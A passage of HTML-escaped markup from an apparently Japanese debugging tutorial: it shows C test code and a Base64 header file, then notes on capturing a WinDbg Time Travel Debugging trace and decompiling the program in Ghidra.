        &lt;span class=&quot;token function&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;DATA(\&quot;%s\&quot;) = \&quot;%s\&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;size &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;size&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; test&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token function&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;base64プログラムのヘッダファイル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E3%83%98%E3%83%83%E3%83%80%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB&quot; aria-label=&quot;base64プログラムのヘッダファイル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64プログラムのヘッダファイル&lt;/h3&gt;
&lt;p&gt;以下は、Base64プログラムのヘッダファイルです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;ifndef&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;__BASE64_H__&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;__BASE64_H__&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Data&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Base64 tables&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; BASE64_TABLE&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; BASE64_TABLE_URL&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; BASE64_TABLE_CUSTOM1&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; BASE64_TABLE_LENGTH &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_TABLE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_TABLE&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// enum型で使用するBase64Tableの種類を定義&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;tagBASE64_TYPE&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    BASE64_TYPE_STANDARD&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    BASE64_TYPE_URL&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    BASE64_TYPE_CUSTOM1
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; BASE64_TYPE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;tagBASE64_SPEC&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    BASE64_TYPE type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; pad&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;lineSep&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; lineSepLength&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; BASE64_SPEC&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; BASE64_SPEC BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;BASE64_TYPE_STANDARD&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BASE64_TABLE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;BASE64_TYPE_URL&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BASE64_TABLE_URL&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;BASE64_TYPE_CUSTOM1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BASE64_TABLE_CUSTOM1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; BASE64_SPECS_LENGTH &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Export function&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; BASE64_TYPE type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;retSize&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; BASE64_TYPE type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Test data&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;tagBASE64_TEST&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    BASE64_TYPE type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; BASE64_TEST&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; BASE64_TEST BASE64_TESTS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;BASE64_TYPE_STANDARD&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;this is test&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;dGhpcyBpcyB0ZXN0&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;BASE64_TYPE_STANDARD&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Hello&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;SGVsbG8=&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;BASE64_TYPE_STANDARD&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Fan-Fan-Fun!!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;RmFuLUZhbi1GdW4hIQ==&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;BASE64_TYPE_STANDARD&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;AAA&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;QUFB&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; BASE64_TESTS_LENGTH &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_TESTS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_TESTS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// !__BASE64_H__&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;windbgでtime-travel-debuggingを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%A7time-travel-debugging%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;windbgでtime travel debuggingを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgでTime Travel Debuggingを取得する&lt;/h2&gt;
&lt;p&gt;ビルドが完了したら、解析を容易にするためにTTDトレースを取得しました。&lt;/p&gt;
&lt;p&gt;TTDトレースの取得方法は以下の記事を参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-008-time-travel-debugging&quot;&gt;【WinDbg Preview】Time Travel Debuggingで始める新しいデバッグ手法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ちなみに、プログラムのビルドができない環境でも、&lt;code class=&quot;language-text&quot;&gt;Try2WinDbg/trace/base64_trace.zip&lt;/code&gt;の中にあるTTDトレースファイルを使うことでTTDを使った解析を行うことができます。&lt;/p&gt;
&lt;h2 id=&quot;base64プログラムをghidraでデコンパイルする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92ghidra%E3%81%A7%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;base64プログラムをghidraでデコンパイルする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64プログラムをGhidraでデコンパイルする&lt;/h2&gt;
&lt;p&gt;トレースファイルの解析の前に、一度GhidraでBase64プログラムをデコンパイルしてみました。&lt;/p&gt;
&lt;h3 id=&quot;entrypointからmain関数を特定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#entrypoint%E3%81%8B%E3%82%89main%E9%96%A2%E6%95%B0%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;entrypointからmain関数を特定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 